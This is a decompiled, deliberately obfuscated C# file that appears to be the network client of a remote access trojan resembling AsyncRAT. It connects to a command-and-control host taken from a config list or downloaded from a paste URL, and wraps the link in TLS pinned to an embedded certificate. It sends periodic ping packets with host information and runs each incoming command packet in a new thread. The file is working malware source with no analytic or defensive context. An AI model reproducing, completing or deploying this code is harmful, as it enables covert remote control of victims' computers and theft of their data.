using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using QoJxByZkfRQq;
using TRjqmOcqLzx;
using cMmGWpngxFJQy;
using yKFnPcLKLkIvyuyev;

namespace msGGXERwBGXueNOI;

public static class rgyWodqfpOexX
{
	public static Socket DYzyXnWRoqSug { get; set; }

	public static SslStream vrpwOtahuUnKa { get; set; }

	private static byte[] QaDWhQuTXnZN { get; set; }

	private static long OfBYAwnmqQleAjg { get; set; }

	private static long njfLopNvSuvxoz { get; set; }

	private static Timer kJvffcIAtjWG { get; set; }

	public static bool IHCXkejMgSAiG { get; set; }

	private static object emtlRGDvQHWy { get; }

	private static Timer ewLTKZtSGAua { get; set; }

	public static int UNiFYaCzQPnA { get; set; }

	public static bool FxqfzeWyYVUSjyA { get; set; }

	public static void GkEmmNOiJGbG()
	{
		try
		{
			DYzyXnWRoqSug = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (hFmOFeqzArJ.ooqQjHHbqA == "null")
			{
				string text = hFmOFeqzArJ.hPBWQkNVSKd.Split(new char[1] { ',' })[new Random().Next(hFmOFeqzArJ.hPBWQkNVSKd.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(hFmOFeqzArJ.LnpFZBhoMBDs.Split(new char[1] { ',' })[new Random().Next(hFmOFeqzArJ.LnpFZBhoMBDs.Split(new char[1] { ',' }).Length)]);
				if (RwsntiWpoCLq(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							DYzyXnWRoqSug.Connect(address, port);
							if (DYzyXnWRoqSug.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					DYzyXnWRoqSug.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
				string[] array = webClient.DownloadString(hFmOFeqzArJ.ooqQjHHbqA).Split(new string[1] { ":" }, StringSplitOptions.None);
				hFmOFeqzArJ.hPBWQkNVSKd = array[0];
				hFmOFeqzArJ.LnpFZBhoMBDs = array[new Random().Next(1, array.Length)];
				DYzyXnWRoqSug.Connect(hFmOFeqzArJ.hPBWQkNVSKd, Convert.ToInt32(hFmOFeqzArJ.LnpFZBhoMBDs));
			}
			if (DYzyXnWRoqSug.Connected)
			{
				IHCXkejMgSAiG = true;
				vrpwOtahuUnKa = new SslStream(new NetworkStream(DYzyXnWRoqSug, ownsSocket: true), leaveInnerStreamOpen: false, LjCKoaKPlYxXM);
				vrpwOtahuUnKa.AuthenticateAsClient(DYzyXnWRoqSug.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				OfBYAwnmqQleAjg = 4L;
				QaDWhQuTXnZN = new byte[OfBYAwnmqQleAjg];
				njfLopNvSuvxoz = 0L;
				hpygdPoBjwmMY(vjHxixAgDbUszIf.xdSPppktIGKa());
				UNiFYaCzQPnA = 0;
				FxqfzeWyYVUSjyA = false;
				kJvffcIAtjWG = new Timer(bptelmtzdkF, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				ewLTKZtSGAua = new Timer(nKiOsKnQKGZYoJR, null, 1, 1);
				vrpwOtahuUnKa.BeginRead(QaDWhQuTXnZN, (int)njfLopNvSuvxoz, (int)OfBYAwnmqQleAjg, OIsltRBRCytUv, null);
			}
			else
			{
				IHCXkejMgSAiG = false;
			}
		}
		catch
		{
			IHCXkejMgSAiG = false;
		}
	}

	private static bool RwsntiWpoCLq(string OuQrPdbEXYQXz)
	{
		return Uri.CheckHostName(OuQrPdbEXYQXz) != UriHostNameType.Unknown;
	}

	private static bool LjCKoaKPlYxXM(object hWxQYMYSoqXbITmlQ, X509Certificate pHzZnUyMfUbqUUK, X509Chain HeFCbFiGse, SslPolicyErrors XtUpAdzuizl)
	{
		return hFmOFeqzArJ.ehWRUIuUsSH.Equals(pHzZnUyMfUbqUUK);
	}

	public static void PLKcHMcfvXLQac()
	{
		try
		{
			vrpwOtahuUnKa?.Dispose();
			DYzyXnWRoqSug?.Dispose();
			ewLTKZtSGAua?.Dispose();
			kJvffcIAtjWG?.Dispose();
		}
		catch
		{
		}
		IHCXkejMgSAiG = false;
	}

	public static void OIsltRBRCytUv(IAsyncResult cIFBoaExzbtz)
	{
		try
		{
			if (DYzyXnWRoqSug.Connected && IHCXkejMgSAiG)
			{
				int num = vrpwOtahuUnKa.EndRead(cIFBoaExzbtz);
				if (num > 0)
				{
					njfLopNvSuvxoz += num;
					OfBYAwnmqQleAjg -= num;
					if (OfBYAwnmqQleAjg == 0L)
					{
						OfBYAwnmqQleAjg = BitConverter.ToInt32(QaDWhQuTXnZN, 0);
						if (OfBYAwnmqQleAjg > 0L)
						{
							njfLopNvSuvxoz = 0L;
							QaDWhQuTXnZN = new byte[OfBYAwnmqQleAjg];
							while (OfBYAwnmqQleAjg > 0L)
							{
								int num2 = vrpwOtahuUnKa.Read(QaDWhQuTXnZN, (int)njfLopNvSuvxoz, (int)OfBYAwnmqQleAjg);
								if (num2 > 0)
								{
									njfLopNvSuvxoz += num2;
									OfBYAwnmqQleAjg -= num2;
									if (OfBYAwnmqQleAjg < 0L)
									{
										IHCXkejMgSAiG = false;
										return;
									}
									continue;
								}
								IHCXkejMgSAiG = false;
								return;
							}
							new Thread(xzhpUDLIXjgv.AIKcIMYWroQqv).Start(QaDWhQuTXnZN);
							njfLopNvSuvxoz = 0L;
							OfBYAwnmqQleAjg = 4L;
							QaDWhQuTXnZN = new byte[OfBYAwnmqQleAjg];
						}
						else
						{
							OfBYAwnmqQleAjg = 4L;
							QaDWhQuTXnZN = new byte[OfBYAwnmqQleAjg];
							njfLopNvSuvxoz = 0L;
						}
					}
					else if (OfBYAwnmqQleAjg < 0L)
					{
						IHCXkejMgSAiG = false;
						return;
					}
					vrpwOtahuUnKa.BeginRead(QaDWhQuTXnZN, (int)njfLopNvSuvxoz, (int)OfBYAwnmqQleAjg, OIsltRBRCytUv, null);
				}
				else
				{
					IHCXkejMgSAiG = false;
				}
			}
			else
			{
				IHCXkejMgSAiG = false;
			}
		}
		catch
		{
			IHCXkejMgSAiG = false;
		}
	}

	public static void hpygdPoBjwmMY(byte[] MrAsovpzBCQCR)
	{
		lock (emtlRGDvQHWy)
		{
			try
			{
				if (!IHCXkejMgSAiG)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(MrAsovpzBCQCR.Length);
				DYzyXnWRoqSug.Poll(-1, SelectMode.SelectWrite);
				vrpwOtahuUnKa.Write(bytes, 0, bytes.Length);
				if (MrAsovpzBCQCR.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(MrAsovpzBCQCR))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							DYzyXnWRoqSug.Poll(-1, SelectMode.SelectWrite);
							vrpwOtahuUnKa.Write(array, 0, num);
							vrpwOtahuUnKa.Flush();
						}
						return;
					}
				}
				DYzyXnWRoqSug.Poll(-1, SelectMode.SelectWrite);
				vrpwOtahuUnKa.Write(MrAsovpzBCQCR, 0, MrAsovpzBCQCR.Length);
				vrpwOtahuUnKa.Flush();
			}
			catch
			{
				IHCXkejMgSAiG = false;
			}
		}
	}

	public static void bptelmtzdkF(object eAURXFSfpI)
	{
		try
		{
			EwTlhZtGQJxOhT ewTlhZtGQJxOhT = new EwTlhZtGQJxOhT();
			ewTlhZtGQJxOhT.RjmBfFMUGNiO("Packet").NTyFKfiOUtVE = "Ping";
			ewTlhZtGQJxOhT.RjmBfFMUGNiO("Message").NTyFKfiOUtVE = mAvhFVqBQBhm.mycqdPxfNM();
			hpygdPoBjwmMY(ewTlhZtGQJxOhT.zdVHdMvzwJZJVpl());
			GC.Collect();
			FxqfzeWyYVUSjyA = true;
		}
		catch
		{
		}
	}

	private static void nKiOsKnQKGZYoJR(object yidDHvLvKVPs)
	{
		try
		{
			if (FxqfzeWyYVUSjyA && IHCXkejMgSAiG)
			{
				UNiFYaCzQPnA++;
			}
		}
		catch
		{
		}
	}

	static rgyWodqfpOexX()
	{
		_003CSendSync_003Ek__BackingField = new object();
	}
}
